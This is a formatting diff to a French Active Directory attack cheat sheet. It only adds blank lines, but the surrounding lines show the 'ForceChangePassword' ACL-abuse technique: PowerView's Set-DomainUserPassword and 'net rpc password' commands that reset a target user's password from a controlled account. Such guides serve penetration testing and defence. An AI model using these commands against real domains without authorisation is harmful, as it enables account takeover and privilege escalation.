@@ -41,6 +41,7 @@ Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -
 ### ForceChangePassword (modification du mot de passe)
 
 Windows
+
 ```powershell
 # Utilisation de credentials alternatifs
 $PrivilegedUserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
@@ -52,6 +53,7 @@ Set-DomainUserPassword -Identity Target_AD_User -Password $newPassword -Credenti
 ```
 
 Linux
+
 ```shell
 # autres méthodes disponibles (voir l'aide de bloodhound)
 net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
